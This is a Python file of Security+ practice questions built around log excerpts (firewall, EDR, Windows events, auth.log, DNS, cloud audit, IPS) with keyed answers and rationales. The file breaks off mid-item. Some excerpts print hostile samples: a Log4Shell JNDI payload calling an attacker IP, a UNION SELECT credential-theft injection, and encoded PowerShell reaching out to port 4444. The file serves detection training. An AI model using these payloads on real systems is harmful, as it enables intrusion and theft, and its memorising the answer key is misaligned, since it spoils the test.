"""CompTIA Security+ SY0-701 practice questions — topical batch: Log Reading.

Scenarios are built around realistic log excerpts across CompTIA's domain 4 log
sources: firewall logs, IDS/IPS alerts, endpoint/EDR logs, Windows Security event
logs, Linux /var/log/auth.log, web/application access logs, DNS query logs,
NetFlow/network logs, packet captures, vulnerability scan output, cloud audit
logs, and SIEM correlation/dashboard views. Each item asks the reader to
identify the compromised host, attack type, source/destination, action taken,
or the correct next step based directly on the log evidence shown.
"""

QUESTIONS = [
    # ---------------------------------------------------------------
    # Log data sources (16) — domain 4, objective 4.9
    # ---------------------------------------------------------------
    {
        "id": "tlog-001",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A firewall log shows the following entries from a single external host within a 10-second window:\n"
            "14:02:01 DENY  203.0.113.77:51422 -> 10.10.5.10:21\n"
            "14:02:01 DENY  203.0.113.77:51423 -> 10.10.5.10:22\n"
            "14:02:02 DENY  203.0.113.77:51424 -> 10.10.5.10:23\n"
            "14:02:02 DENY  203.0.113.77:51425 -> 10.10.5.10:80\n"
            "14:02:03 DENY  203.0.113.77:51426 -> 10.10.5.10:443\n"
            "14:02:03 DENY  203.0.113.77:51427 -> 10.10.5.10:3389\n"
            "What activity do these log entries MOST likely indicate?"
        ),
        "options": [
            {"id": "a", "text": "A port scan/reconnaissance sweep against 10.10.5.10", "correct": True,
             "rationale": "Correct. A single source rapidly probing many different destination ports (21, 22, 23, "
                          "80, 443, 3389) on the same target within seconds is the classic signature of a port "
                          "scan, and every attempt was denied, consistent with reconnaissance against a filtered host."},
            {"id": "b", "text": "A successful brute-force login against the target", "correct": False,
             "rationale": "Incorrect. Every entry shows DENY at the network layer across many different ports; "
                          "brute force implies repeated authentication attempts against a single open service, "
                          "not a sweep of denied connections across six unrelated ports."},
            {"id": "c", "text": "A volumetric DDoS attack against 10.10.5.10", "correct": False,
             "rationale": "Incorrect. DDoS involves overwhelming volume from many distributed sources; this log "
                          "shows only six connection attempts from a single source IP (203.0.113.77), far too low "
                          "in volume and single-sourced to represent a DDoS flood."},
            {"id": "d", "text": "Normal load-balancer health checks", "correct": False,
             "rationale": "Incorrect. Health checks target one or two consistent, expected ports at regular "
                          "intervals; this log shows an external IP sweeping six different, unrelated ports "
                          "(including 23/Telnet and 3389/RDP) within two seconds, which is not health-check behavior."},
        ],
        "explanation": (
            "Rapid, sequential connection attempts to multiple different destination ports from a single source "
            "IP in a short window is the textbook signature of a port/service scan. Firewall DENY logs are the "
            "authoritative source for identifying this kind of reconnaissance before it escalates to exploitation."
        ),
    },
    {
        "id": "tlog-002",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A perimeter firewall log shows the following ALLOW entries for a single internal host:\n"
            "09:14:02 ALLOW 10.20.1.55:49812 -> 198.51.100.44:443 bytes_out=850000\n"
            "09:14:35 ALLOW 10.20.1.55:49813 -> 198.51.100.44:443 bytes_out=920000\n"
            "09:15:02 ALLOW 10.20.1.55:49814 -> 198.51.100.44:443 bytes_out=1050000\n"
            "The same pattern repeats every 30 seconds for six hours, totaling roughly 42 GB transferred to a "
            "cloud storage IP range that is not used by any approved backup job. Which conclusion is BEST "
            "supported by this log?"
        ),
        "options": [
            {"id": "a", "text": "Likely data exfiltration to an unauthorized external destination", "correct": True,
             "rationale": "Correct. A sustained, high-volume outbound transfer (42 GB over six hours) from an "
                          "internal host to an external IP range with no approved business purpose is a strong "
                          "indicator of data exfiltration."},
            {"id": "b", "text": "A legitimate nightly backup job to the corporate cloud provider", "correct": False,
             "rationale": "Incorrect. The scenario explicitly states the destination IP range is not used by any "
                          "approved backup job, ruling out this explanation despite the superficially regular "
                          "interval."},
            {"id": "c", "text": "A DNS tunneling attack", "correct": False,
             "rationale": "Incorrect. DNS tunneling uses UDP/TCP port 53 with many small DNS queries; this traffic "
                          "is TCP/443 with large, multi-hundred-kilobyte transfers, which does not match DNS "
                          "tunneling's traffic profile."},
            {"id": "d", "text": "An inbound DDoS attack against the host", "correct": False,
             "rationale": "Incorrect. Every entry is ALLOW traffic originating outbound from the internal host "
                          "10.20.1.55, not an inbound flood directed at it."},
        ],
        "explanation": (
            "Firewall ALLOW logs showing sustained, large-volume outbound transfers to an external destination "
            "with no legitimate business justification are a primary indicator of data exfiltration and should "
            "drive immediate investigation of the source host."
        ),
    },
    {
        "id": "tlog-003",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "An EDR endpoint log shows the following process tree on a workstation:\n"
            "10:41:03 winword.exe (PID 4102) spawned cmd.exe (PID 5588)\n"
            "10:41:04 cmd.exe (PID 5588) spawned powershell.exe (PID 5601) -enc <base64>\n"
            "10:41:06 powershell.exe (PID 5601) initiated outbound connection to 45.33.32.156:4444\n"
            "Which conclusion is BEST supported by this endpoint log?"
        ),
        "options": [
            {"id": "a", "text": "A malicious macro in a Word document executed an encoded PowerShell command "
                                 "that established a connection to a likely C2 server", "correct": True,
             "rationale": "Correct. winword.exe spawning cmd.exe, which spawns an obfuscated, base64-encoded "
                          "(-enc) PowerShell command that then connects to an external IP, is a classic "
                          "macro-malware-to-C2 execution chain."},
            {"id": "b", "text": "The user manually opened PowerShell ISE to write a script", "correct": False,
             "rationale": "Incorrect. The process tree clearly shows winword.exe as the parent of cmd.exe, which "
                          "spawned powershell.exe — this is automated macro execution, not a user directly "
                          "launching a scripting environment."},
            {"id": "c", "text": "A scheduled Windows Update task triggered a routine PowerShell maintenance "
                                 "script", "correct": False,
             "rationale": "Incorrect. Windows Update tasks do not spawn from winword.exe, and base64-encoded "
                          "(-enc) obfuscation is not standard for OS maintenance scripts."},
            {"id": "d", "text": "The workstation is running a legitimate mail-merge automation script",
             "correct": False,
             "rationale": "Incorrect. Mail merge does not spawn cmd.exe/powershell.exe with obfuscated encoded "
                          "commands, nor does it initiate outbound connections to a raw external IP on port 4444."},
        ],
        "explanation": (
            "Endpoint/EDR process-tree logs directly reveal parent-child execution chains. winword.exe -> cmd.exe "
            "-> encoded PowerShell -> external connection is a well-documented malicious macro execution pattern "
            "used to establish command-and-control."
        ),
    },
    {
        "id": "tlog-004",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "The Windows Security log on a domain controller shows:\n"
            "4625  Logon Failure  Account: jsmith  Source: 10.0.9.44  02:14:01\n"
            "4625  Logon Failure  Account: jsmith  Source: 10.0.9.44  02:14:03\n"
            "4625  Logon Failure  Account: jsmith  Source: 10.0.9.44  02:14:05\n"
            "(47 more Logon Failure entries for jsmith from 10.0.9.44 within the next 3 minutes)\n"
            "4624  Logon Success  Account: jsmith  Source: 10.0.9.44  02:17:12\n"
            "What does this sequence MOST likely indicate?"
        ),
        "options": [
            {"id": "a", "text": "A successful brute-force/password-guessing attack against the jsmith account",
             "correct": True,
             "rationale": "Correct. Fifty repeated 4625 logon failures from the same source in about three "
                          "minutes, immediately followed by a 4624 success from that same source, is the "
                          "signature of a brute-force attack that ultimately guessed the correct password."},
            {"id": "b", "text": "The jsmith account was locked out due to a stale cached credential on the "
                                 "user's laptop", "correct": False,
             "rationale": "Incorrect. A stale cached credential typically produces a handful of failures before "
                          "the user re-enters the correct password, not fifty rapid-fire failures within minutes "
                          "from a single source before success."},
            {"id": "c", "text": "A Kerberoasting attack against the domain controller", "correct": False,
             "rationale": "Incorrect. Kerberoasting involves requesting service tickets (TGS) for offline "
                          "cracking and does not generate repeated 4625 interactive logon failures; this log "
                          "shows a direct password-guessing pattern."},
            {"id": "d", "text": "A normal password change requiring cached credential resync across multiple "
                                 "devices", "correct": False,
             "rationale": "Incorrect. A resync event would not produce fifty failures from a single source within "
                          "minutes before a success; that volume and speed indicate automated password guessing."},
        ],
        "explanation": (
            "Windows Security Event ID 4625 (failure) in rapid, high-volume repetition from one source, followed "
            "by 4624 (success), is the definitive brute-force pattern in Windows authentication logs."
        ),
    },
    {
        "id": "tlog-005",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A Windows Security log shows:\n"
            "4688  New Process  cmd.exe  Creator: svc_backup  10.0.2.31  03:02:10\n"
            "4672  Special Privileges Assigned  Account: svc_backup  Privileges: SeDebugPrivilege, "
            "SeTcbPrivilege  10.0.2.31  03:02:11\n"
            "4688  New Process  mimikatz.exe  Creator: svc_backup  10.0.2.31  03:02:14\n"
            "Which finding is MOST concerning in this log excerpt, and why?"
        ),
        "options": [
            {"id": "a", "text": "The svc_backup service account was granted debug-level privileges and then "
                                 "used to launch a known credential-dumping tool, indicating privilege escalation "
                                 "and likely credential theft", "correct": True,
             "rationale": "Correct. Event 4672 shows SeDebugPrivilege being assigned to svc_backup, and the very "
                          "next 4688 event shows that same account launching mimikatz.exe — a widely recognized "
                          "credential-dumping tool. Together these indicate escalation followed by credential theft."},
            {"id": "b", "text": "cmd.exe execution alone is a routine administrative action and requires no "
                                 "further review", "correct": False,
             "rationale": "Incorrect. Taken alone cmd.exe might be routine, but in this log it is immediately "
                          "followed by privilege elevation and a mimikatz launch by the same service account, "
                          "which is not routine and demands review."},
            {"id": "c", "text": "Event ID 4688 only logs failed process creation attempts, so no process "
                                 "actually executed", "correct": False,
             "rationale": "Incorrect. This is factually wrong — Event ID 4688 logs successful new process "
                          "creation, not failures, meaning cmd.exe and mimikatz.exe both actually launched."},
            {"id": "d", "text": "The 03:02 timestamp indicates this occurred during an approved backup "
                                 "maintenance window, so it should be dismissed", "correct": False,
             "rationale": "Incorrect. Even during a maintenance window, a service account gaining SeDebugPrivilege "
                          "and then launching mimikatz is not routine backup behavior and warrants investigation "
                          "regardless of timing."},
        ],
        "explanation": (
            "Correlating Event ID 4672 (special privilege assignment) with a subsequent 4688 (process creation) "
            "showing a known credential-dumping tool reveals a privilege-escalation-to-credential-theft chain "
            "that a single event in isolation would not fully expose."
        ),
    },
    {
        "id": "tlog-006",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "/var/log/auth.log on a Linux web server shows:\n"
            "Jul 14 03:10:02 web01 sshd[2211]: Failed password for root from 198.51.100.9 port 51244 ssh2\n"
            "Jul 14 03:10:04 web01 sshd[2211]: Failed password for root from 198.51.100.9 port 51246 ssh2\n"
            "Jul 14 03:10:06 web01 sshd[2211]: Failed password for root from 198.51.100.9 port 51248 ssh2\n"
            "(112 more Failed password lines for root from 198.51.100.9 over the next 6 minutes)\n"
            "Jul 14 03:16:40 web01 sshd[2298]: Accepted password for root from 198.51.100.9 port 51360 ssh2\n"
            "Which single change would have MOST effectively prevented this outcome?"
        ),
        "options": [
            {"id": "a", "text": "Disable direct root SSH login (PermitRootLogin no), enforce key-based "
                                 "authentication, and add automated lockout after repeated failures",
             "correct": True,
             "rationale": "Correct. The attacker targeted the root account directly over password authentication "
                          "and eventually guessed it correctly; disabling root SSH login, requiring keys, and "
                          "locking out repeated failures would have prevented this exact brute-force success."},
            {"id": "b", "text": "Rotate the server's SSH host key", "correct": False,
             "rationale": "Incorrect. The host key verifies the server's identity to connecting clients; it has "
                          "no effect on preventing brute-force password guessing against a user account."},
            {"id": "c", "text": "Increase the SSH session idle timeout", "correct": False,
             "rationale": "Incorrect. Idle timeout controls how long an already-established session stays open; "
                          "it does not prevent repeated failed authentication attempts from occurring."},
            {"id": "d", "text": "Move the SSH daemon to listen on IPv6 only", "correct": False,
             "rationale": "Incorrect. Changing the IP version the service listens on does not prevent brute-force "
                          "attempts if the service remains reachable and password authentication stays enabled."},
        ],
        "explanation": (
            "Linux auth.log lines showing 'Failed password for root' repeated dozens of times from one source, "
            "followed by 'Accepted password,' indicate a successful brute-force attack against the root account "
            "over password authentication — precisely what disabling root login and enforcing keys prevents."
        ),
    },
    {
        "id": "tlog-007",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "DNS server query logs show a single internal host generating an unusual volume of queries:\n"
            "10:02:01  10.30.4.12  query  a8f3e91b2c.exfil-data.badhost.net  TXT\n"
            "10:02:03  10.30.4.12  query  b71c04ff8e.exfil-data.badhost.net  TXT\n"
            "10:02:05  10.30.4.12  query  d92a115bc3.exfil-data.badhost.net  TXT\n"
            "The same host continues at roughly 20 unique subdomain queries per minute, all TXT record type, all "
            "under the same second-level domain, for 4 hours. What does this pattern MOST likely indicate?"
        ),
        "options": [
            {"id": "a", "text": "DNS tunneling being used to exfiltrate data or maintain covert "
                                 "command-and-control communication", "correct": True,
             "rationale": "Correct. A high-rate stream of unique, algorithmically-generated subdomain labels "
                          "queried as TXT records under one domain is the classic DNS tunneling signature used "
                          "for covert data channels."},
            {"id": "b", "text": "Normal DNS caching behavior refreshing TTL-expired records", "correct": False,
             "rationale": "Incorrect. TTL refresh queries repeat the SAME domain name periodically; they do not "
                          "generate a constant stream of new, unique-looking subdomain strings every few seconds."},
            {"id": "c", "text": "A misconfigured internal DNS forwarder retrying failed lookups", "correct": False,
             "rationale": "Incorrect. Retries repeat the identical failed query; they would not generate a new, "
                          "distinct random-looking subdomain string with each attempt."},
            {"id": "d", "text": "A certificate transparency log monitoring tool", "correct": False,
             "rationale": "Incorrect. CT monitoring tools query known domains via HTTPS APIs, not a sustained "
                          "high-volume stream of unique TXT-record subdomain DNS lookups."},
        ],
        "explanation": (
            "DNS logs revealing a high rate of unique, randomized subdomain queries of type TXT under a single "
            "domain — sustained over hours — is a well-known indicator of DNS tunneling, used for data "
            "exfiltration or covert C2 when other outbound channels are blocked."
        ),
    },
    {
        "id": "tlog-008",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_response",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A SOC analyst suspects an attacker used stolen credentials to move from a compromised workstation "
            "(10.4.2.90) to a file server (10.4.9.5). Select TWO log sources that would provide the MOST direct "
            "evidence to confirm this lateral movement occurred."
        ),
        "options": [
            {"id": "a", "text": "Windows Security Event ID 4624 (logon) records on the file server showing the "
                                 "logon type, source workstation, and account used", "correct": True,
             "rationale": "Correct. A 4624 event on the file server directly records which account authenticated, "
                          "from which source, and by what logon type — direct evidence of the lateral movement."},
            {"id": "b", "text": "NetFlow/firewall logs showing an SMB (TCP 445) session from 10.4.2.90 to "
                                 "10.4.9.5 at the same time", "correct": True,
             "rationale": "Correct. A corroborating network-layer log showing the actual SMB session between the "
                          "two hosts at the matching timestamp confirms the connection path used for the move."},
            {"id": "c", "text": "Printer spooler service logs on the file server", "correct": False,
             "rationale": "Incorrect. Print spooler logs record printing activity and have no relevance to "
                          "authentication or network session evidence for lateral movement."},
            {"id": "d", "text": "The organization's asset inventory spreadsheet listing the file server's "
                                 "warranty expiration date", "correct": False,
             "rationale": "Incorrect. Warranty/inventory metadata provides no information about logon activity or "
                          "network connections and does not help confirm lateral movement."},
        ],
        "explanation": (
            "Confirming lateral movement requires correlating an authentication log (who logged on, from where) "
            "with a network log (the actual session between the two hosts). Unrelated logs like print spoolers "
            "or asset metadata provide no evidentiary value for this specific question."
        ),
    },
    {
        "id": "tlog-009",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A packet capture of traffic to an internal HR portal shows the following reconstructed HTTP stream:\n"
            "POST /login.php HTTP/1.1\n"
            "Host: hr-portal.internal.corp\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "\n"
            "username=mgarcia&password=Summer2025!\n"
            "Which finding should the analyst report as the PRIMARY security issue?"
        ),
        "options": [
            {"id": "a", "text": "The HR portal is transmitting credentials in cleartext over unencrypted HTTP, "
                                 "exposing them to anyone capturing packets on the path", "correct": True,
             "rationale": "Correct. The packet capture shows the actual plaintext username and password readable "
                          "in the reconstructed stream, proving the login form submits over unencrypted HTTP "
                          "rather than HTTPS/TLS."},
            {"id": "b", "text": "The username field reveals the employee's naming convention, which is a "
                                 "critical vulnerability", "correct": False,
             "rationale": "Incorrect. Username format disclosure is a minor concern compared to the cleartext "
                          "password exposure, which is the primary, directly exploitable issue shown here."},
            {"id": "c", "text": "The Content-Type header indicates a cross-site scripting (XSS) vulnerability",
             "correct": False,
             "rationale": "Incorrect. This header simply describes standard URL-encoded form data; it has no "
                          "relationship to XSS."},
            {"id": "d", "text": "The POST method itself is insecure and GET should be used instead",
             "correct": False,
             "rationale": "Incorrect. POST is the appropriate method for submitting credentials; switching to GET "
                          "would be worse, since credentials would then appear in URLs, browser history, and "
                          "server logs."},
        ],
        "explanation": (
            "Packet captures let analysts see exactly what data traverses the network. A readable plaintext "
            "username/password pair in a reconstructed stream is direct proof of a missing-TLS vulnerability, "
            "the most critical finding in this capture."
        ),
    },
    {
        "id": "tlog-010",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A vulnerability scan report includes the following findings for a single internet-facing host:\n"
            "CVE-2024-11021  CVSS 9.8  Remote Code Execution  Exploit: Public/Weaponized  Host: 10.1.1.50\n"
            "CVE-2024-08812  CVSS 7.5  Denial of Service  Exploit: None known  Host: 10.1.1.50\n"
            "CVE-2023-44210  CVSS 5.3  Information Disclosure  Exploit: None known  Host: 10.1.1.50\n"
            "CVE-2024-19004  CVSS 9.1  Privilege Escalation  Exploit: Proof-of-concept only  Host: 10.1.1.50\n"
            "Given limited patching resources this week, which finding should be remediated FIRST?"
        ),
        "options": [
            {"id": "a", "text": "CVE-2024-11021 — highest CVSS score (9.8) combined with a publicly available, "
                                 "weaponized exploit against an internet-facing host", "correct": True,
             "rationale": "Correct. This finding has both the highest severity score AND a weaponized, publicly "
                          "available exploit against a host reachable from the internet, representing the "
                          "greatest immediate real-world risk."},
            {"id": "b", "text": "CVE-2024-19004 — second-highest CVSS score, so it should be patched first "
                                 "regardless of exploit availability", "correct": False,
             "rationale": "Incorrect. While its score is close, CVE-2024-11021 has a higher score AND a fully "
                          "weaponized exploit (versus proof-of-concept only), making it the greater actual risk; "
                          "score alone should not override exploit maturity."},
            {"id": "c", "text": "CVE-2024-08812 — denial of service vulnerabilities always take priority because "
                                 "they affect availability", "correct": False,
             "rationale": "Incorrect. This entry has the lowest CVSS among the top three and no known exploit; "
                          "prioritizing it over an actively exploitable RCE is not risk-appropriate."},
            {"id": "d", "text": "CVE-2023-44210 — oldest CVE identifier, so it has had the most time for "
                                 "attackers to develop exploits", "correct": False,
             "rationale": "Incorrect. CVE age does not correlate with actual exploit availability; this finding "
                          "explicitly lists 'None known' and has the lowest severity of the four."},
        ],
        "explanation": (
            "Vulnerability scan output should be prioritized by combining CVSS severity with real-world exploit "
            "availability and asset exposure. A weaponized exploit against a critical, internet-facing "
            "vulnerability outranks a slightly lower or higher score alone."
        ),
    },
    {
        "id": "tlog-011",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "An analyst reviews the full headers of a suspicious email:\n"
            "From: IT Support <it-support@company.com>\n"
            "Return-Path: <bounce@sketchy-mailer.ru>\n"
            "Received: from mail.sketchy-mailer.ru (203.0.113.201) by mx.company.com\n"
            "Authentication-Results: mx.company.com; spf=fail smtp.mailfrom=sketchy-mailer.ru; dkim=fail\n"
            "Which conclusion is BEST supported by this email metadata?"
        ),
        "options": [
            {"id": "a", "text": "The message is a spoofed/phishing email — the visible From address doesn't "
                                 "match the originating server, and both SPF and DKIM failed", "correct": True,
             "rationale": "Correct. The Return-Path and Received header show the message actually originated "
                          "from sketchy-mailer.ru (203.0.113.201), and Authentication-Results confirms both SPF "
                          "and DKIM failed, proving the displayed From address was forged."},
            {"id": "b", "text": "The email is legitimate because the From address correctly shows it came from "
                                 "company.com's IT Support team", "correct": False,
             "rationale": "Incorrect. The visible From header can be freely forged; the Received chain, "
                          "Return-Path, and failed SPF/DKIM prove the actual sending infrastructure was not "
                          "company.com."},
            {"id": "c", "text": "The DKIM failure alone is inconclusive and should be ignored since SPF is the "
                                 "only authoritative check", "correct": False,
             "rationale": "Incorrect. Both SPF and DKIM failed in this log, and dismissing corroborating evidence "
                          "of forgery is not appropriate."},
            {"id": "d", "text": "This is a normal bounce-back notification from the company's own mail relay",
             "correct": False,
             "rationale": "Incorrect. The Received header and Return-Path point to an external, unrelated domain "
                          "(sketchy-mailer.ru), not the company's own mail relay."},
        ],
        "explanation": (
            "Email header metadata — Return-Path, Received chain, and Authentication-Results — reveals the true "
            "sending infrastructure regardless of what the visible From address claims, making it essential for "
            "identifying spoofed/phishing mail."
        ),
    },
    {
        "id": "tlog-012",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A web application access log shows the following request:\n"
            '10.44.2.9 - - [16/Jul/2026:11:02:04] "GET /products.php?id=7%20UNION%20SELECT%20username,'
            'password%20FROM%20users-- HTTP/1.1" 200 4821 "-" "sqlmap/1.7"\n'
            "Which conclusion is BEST supported by this single log line?"
        ),
        "options": [
            {"id": "a", "text": "The request contains a UNION-based SQL injection payload attempting to "
                                 "extract usernames and passwords, and the User-Agent confirms an automated "
                                 "SQLi scanning tool", "correct": True,
             "rationale": "Correct. The URL-decoded query string reads 'UNION SELECT username, password FROM "
                          "users--', and the User-Agent 'sqlmap/1.7' identifies a known automated SQL injection "
                          "tool, directly confirming both the technique and the tool used."},
            {"id": "b", "text": "The 200 status code proves the injection failed, since a successful attack "
                                 "would return a 500 server error", "correct": False,
             "rationale": "Incorrect. A 200 response indicates the request was processed normally; a successful "
                          "injection often returns 200 with the attacker's extracted data embedded in the "
                          "response, not necessarily an error code."},
            {"id": "c", "text": "This is a false positive because the request uses the GET method, and SQL "
                                 "injection can only occur via POST requests", "correct": False,
             "rationale": "Incorrect. SQL injection can be delivered via any parameter-carrying method, including "
                          "GET query strings, exactly as shown in this log line."},
            {"id": "d", "text": "The request is a routine product lookup; 'UNION SELECT' is a standard SQL "
                                 "clause used by the application's search feature", "correct": False,
             "rationale": "Incorrect. A legitimate product-lookup request would not contain a UNION SELECT "
                          "targeting the users table for username/password columns, nor originate from a tool "
                          "identified as sqlmap."},
        ],
        "explanation": (
            "Web/application access logs capture the full request line and User-Agent, both of which are needed "
            "to identify SQL injection attempts: the decoded query string reveals the injected SQL syntax, and "
            "the User-Agent often reveals the automated tool used to deliver it."
        ),
    },
    {
        "id": "tlog-013",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A cloud provider's audit log shows:\n"
            "2026-07-15T22:04:11Z  eventName=CreateAccessKey  user=svc-deploy  sourceIP=185.220.101.7\n"
            "2026-07-15T22:04:44Z  eventName=AttachUserPolicy  user=svc-deploy  policy=AdministratorAccess  "
            "sourceIP=185.220.101.7\n"
            "2026-07-15T22:05:02Z  eventName=CreateUser  user=svc-deploy  newUser=backup-admin  "
            "sourceIP=185.220.101.7\n"
            "The svc-deploy account normally only runs CI/CD deployment scripts from the corporate build "
            "server's IP range (10.0.0.0/16) and has never previously called IAM APIs. What does this log MOST "
            "likely represent?"
        ),
        "options": [
            {"id": "a", "text": "A compromised service account being used to create a new access key, "
                                 "self-escalate to administrator privileges, and establish a persistent "
                                 "backdoor account", "correct": True,
             "rationale": "Correct. The source IP (185.220.101.7) falls outside the account's normal 10.0.0.0/16 "
                          "range, and the account performs IAM actions it has never used before, culminating in "
                          "creating a new admin-capable user — a classic cloud account takeover/persistence chain."},
            {"id": "b", "text": "A routine automated credential rotation performed by the CI/CD pipeline",
             "correct": False,
             "rationale": "Incorrect. Credential rotation would not include attaching AdministratorAccess or "
                          "creating a brand-new user named 'backup-admin,' and would originate from the known "
                          "10.0.0.0/16 build server range, not an external IP."},
            {"id": "c", "text": "A cloud provider health-check process validating IAM configuration",
             "correct": False,
             "rationale": "Incorrect. Provider health checks do not create access keys, attach admin policies, "
                          "or create new user accounts under a customer's service account."},
            {"id": "d", "text": "An expected quarterly access review conducted by the cloud security team",
             "correct": False,
             "rationale": "Incorrect. Access reviews are typically read-only audits; they do not create access "
                          "keys, attach AdministratorAccess, or create new user accounts."},
        ],
        "explanation": (
            "Cloud audit logs record every API call with the acting identity and source IP. A service account "
            "suddenly calling unfamiliar IAM APIs from an unexpected IP, culminating in privilege escalation and "
            "a new user account, is a hallmark of cloud account compromise and persistence."
        ),
    },
    {
        "id": "tlog-014",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "NetFlow records for a single internal host show outbound connections at strikingly regular "
            "intervals:\n"
            "14:00:00  10.5.2.88 -> 91.198.174.2:8080  bytes=512\n"
            "14:05:00  10.5.2.88 -> 91.198.174.2:8080  bytes=498\n"
            "14:10:00  10.5.2.88 -> 91.198.174.2:8080  bytes=505\n"
            "14:15:00  10.5.2.88 -> 91.198.174.2:8080  bytes=511\n"
            "The same connection repeats every 5 minutes, with nearly identical byte counts, for the past three "
            "days, to an IP with no reverse DNS record and no business relationship with the organization. This "
            "pattern is MOST consistent with which type of activity?"
        ),
        "options": [
            {"id": "a", "text": "Command-and-control (C2) beaconing, where malware checks in with its "
                                 "controller at a fixed interval", "correct": True,
             "rationale": "Correct. Highly regular timing (every 5 minutes), a consistent small payload size, and "
                          "an unexplained external destination with no reverse DNS or business relationship are "
                          "classic beaconing indicators."},
            {"id": "b", "text": "A scheduled Windows Update check-in", "correct": False,
             "rationale": "Incorrect. Windows Update traffic goes to Microsoft-owned, resolvable domains/IPs, not "
                          "an unregistered IP with no reverse DNS, and does not use a fixed 512-byte payload on "
                          "port 8080 every 5 minutes."},
            {"id": "c", "text": "VoIP call signaling traffic", "correct": False,
             "rationale": "Incorrect. VoIP signaling (e.g., SIP) uses different ports/protocols tied to actual "
                          "call activity, not a fixed 5-minute heartbeat to an unrelated external IP over three days."},
            {"id": "d", "text": "A misconfigured NTP client polling too frequently", "correct": False,
             "rationale": "Incorrect. NTP uses UDP/123 to legitimate time servers, not TCP-style flows to port "
                          "8080 on an unrelated IP with no reverse DNS."},
        ],
        "explanation": (
            "NetFlow/network logs reveal traffic timing and volume patterns that packet content alone might not "
            "show. Highly regular intervals with consistent small payload sizes to an unexplained external "
            "destination are a well-known beaconing indicator of compromise."
        ),
    },
    {
        "id": "tlog-015",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "An IPS alert fires with the following details:\n"
            "Signature: ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)\n"
            "Src: 203.0.113.15:44210  Dst: 10.7.3.20:8443\n"
            "Payload snippet: ${jndi:ldap://45.33.32.156:1389/Exploit}\n"
            "Action: DROP\n"
            "What does this alert indicate, and was the described action sufficient?"
        ),
        "options": [
            {"id": "a", "text": "An attacker attempted a Log4Shell JNDI injection exploit against the web "
                                 "server, and the IPS DROP action blocked this attempt; the underlying Log4j "
                                 "library still needs to be patched", "correct": True,
             "rationale": "Correct. The signature and payload (${jndi:ldap://...}) confirm a Log4Shell exploit "
                          "attempt, and the Action field shows DROP, meaning the IPS blocked it at the network "
                          "layer — but the vulnerable library itself still requires patching against future attempts."},
            {"id": "b", "text": "The alert indicates a successful compromise because the payload was logged, "
                                 "meaning it already executed on the target", "correct": False,
             "rationale": "Incorrect. The Action field explicitly shows DROP, meaning the IPS blocked the "
                          "malicious packet before it reached the application; logging the payload does not "
                          "equal successful execution."},
            {"id": "c", "text": "This is a benign LDAP directory lookup performed by the application itself",
             "correct": False,
             "rationale": "Incorrect. The JNDI/LDAP string is a known Log4Shell exploit payload targeting an "
                          "external attacker-controlled IP (45.33.32.156), not a normal application-initiated "
                          "directory lookup."},
            {"id": "d", "text": "No further action is required since the IPS already dropped the packet and "
                                 "Log4j does not need to be patched", "correct": False,
             "rationale": "Incorrect. A network-layer block stops this one attempt but does not remediate the "
                          "underlying vulnerable Log4j library, which remains exploitable via other vectors until "
                          "patched."},
        ],
        "explanation": (
            "IDS/IPS logs identify the specific attack signature, source, destination, and action taken. A "
            "blocked exploit attempt is not the same as remediation — the underlying vulnerability must still be "
            "patched to prevent future, potentially successful, attempts."
        ),
    },
    {
        "id": "tlog-016",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "Windows Security logs collected in the SIEM show Logon Type 3 (network) successes for the SAME "
            "account across multiple hosts within two minutes:\n"
            "4624  Logon Type 3  Account: svc_sql  Source: 10.2.1.9   Target: FILESRV01  09:30:02\n"
            "4624  Logon Type 3  Account: svc_sql  Source: 10.2.1.9   Target: FILESRV02  09:30:41\n"
            "4624  Logon Type 3  Account: svc_sql  Source: 10.2.1.9   Target: HR-DB01    09:31:18\n"
            "4624  Logon Type 3  Account: svc_sql  Source: 10.2.1.9   Target: FINANCE01  09:31:55\n"
            "The svc_sql account has never authenticated to any of these four servers before. What does this "
            "pattern MOST likely indicate?"
        ),
        "options": [
            {"id": "a", "text": "Lateral movement — a compromised host (10.2.1.9) is using the svc_sql "
                                 "account's credentials to rapidly authenticate across multiple unrelated "
                                 "servers", "correct": True,
             "rationale": "Correct. A single source host using one service account to network-logon (Type 3) to "
                          "four previously-unvisited, unrelated servers within about two minutes is a textbook "
                          "lateral movement pattern using stolen/misused credentials."},
            {"id": "b", "text": "Normal Active Directory replication traffic between domain controllers",
             "correct": False,
